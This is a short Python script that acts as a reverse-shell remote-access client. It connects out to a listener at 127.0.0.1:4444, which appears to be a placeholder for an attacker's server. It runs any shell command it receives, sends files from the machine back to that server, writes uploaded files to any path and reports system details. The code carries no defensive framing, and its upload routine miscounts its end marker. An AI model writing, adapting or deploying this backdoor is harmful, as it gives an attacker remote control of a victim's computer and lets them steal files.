import socket
import subprocess
import os
import platform

SERVER_IP = '127.0.0.1'
PORT = 4444

def list_directory(path):
    try:
        items = os.listdir(path)
        return "\n".join(items).encode()
    except Exception as e:
        return f"Error listing directory: {str(e)}".encode()

def send_file(client, filepath):
    try:
        with open(filepath, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client.send(data)
        client.send(b"<<END>>")
    except Exception as e:
        client.send(f"[!] Failed to read file: {str(e)}<<END>>".encode())

def get_sysinfo():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.machine(),
        "Hostname": platform.node(),
        "Processor": platform.processor()
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items()).encode()

def main():
    client = socket.socket()
    client.connect((SERVER_IP, PORT))

    while True:
        command = client.recv(1024).decode()
        if command == "exit":
            break
        elif command.startswith("listdir "):
            path = command[8:].strip()
            result = list_directory(path)
        elif command.startswith("getfile "):
            filepath = command[len("getfile "):].strip()
            send_file(client, filepath)
            continue
        elif command.startswith("cd "):
            path = command[3:].strip()
            try:
                os.chdir(path)
                result = f"[+] Changed directory to: {os.getcwd()}".encode()
            except Exception as e:
                result = f"[!] Failed to change directory: {str(e)}".encode()
        elif command == "sysinfo":
            result = get_sysinfo()
        elif command.startswith("putfile "):
            try:
                parts = command.split(" ", 2)
                remote_path = parts[2]
                with open(remote_path, "wb") as f:
                    while True:
                        data = client.recv(1024)
                        if data.endswith(b"<<END>>"):
                            f.write(data[:-8])
                            break
                        f.write(data)
                result = f"[+] File uploaded successfully to {remote_path}".encode()
            except Exception as e:
                result = f"[!] Failed to save uploaded file: {str(e)}".encode()
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                result = e.output

        client.send(result)

    client.close()

if __name__ == "__main__":
    main()
